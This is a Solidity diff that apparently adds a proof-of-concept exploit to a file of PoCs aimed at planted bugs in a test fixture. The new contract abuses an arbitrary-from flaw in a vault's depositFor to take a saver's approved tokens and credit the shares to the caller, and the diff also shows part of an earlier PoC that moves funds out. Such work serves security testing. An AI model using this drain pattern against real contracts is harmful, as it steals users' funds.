@@ -7,7 +7,7 @@ pragma solidity 0.8.28;
 // against this repo's fixture. Each PoC runs as one contract-creation transaction from a fresh
 // salted sender (Antibody bundle mode); B and E need no contract (a single call).
 
-import {AcmeETH, AcmeUSD} from "../../../src/acme/AcmeTokens.sol";
+import {AcmeETH, AcmeUSD, IAcmeToken} from "../../../src/acme/AcmeTokens.sol";
 import {AcmePool} from "../../../src/acme/AcmePool.sol";
 import {AcmeLend} from "../../../src/acme/AcmeLend.sol";
 import {AcmeVault} from "../../../src/acme/AcmeVault.sol";
@@ -85,6 +85,15 @@ contract PocF_UncheckedRepay {
         eth.withdraw(eth.balanceOf(address(this)));
         usd.transfer(msg.sender, usd.balanceOf(address(this)));
         payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+/// Hunter G (gap lane) — planted bug #5: AcmeVault.depositFor takes the saver's approved acUSD and
+/// gives the shares to the caller. No committed invariant breaks; the saver loses all of it. (Withdrawing
+/// the shares would also touch the declared known issue's rounding, so the PoC keeps them.)
+contract PocG_ArbitraryFrom {
+    constructor(AcmeVault vault, IAcmeToken usd, address saver) {
+        vault.depositFor(saver, usd.balanceOf(saver));
     }
 }
 
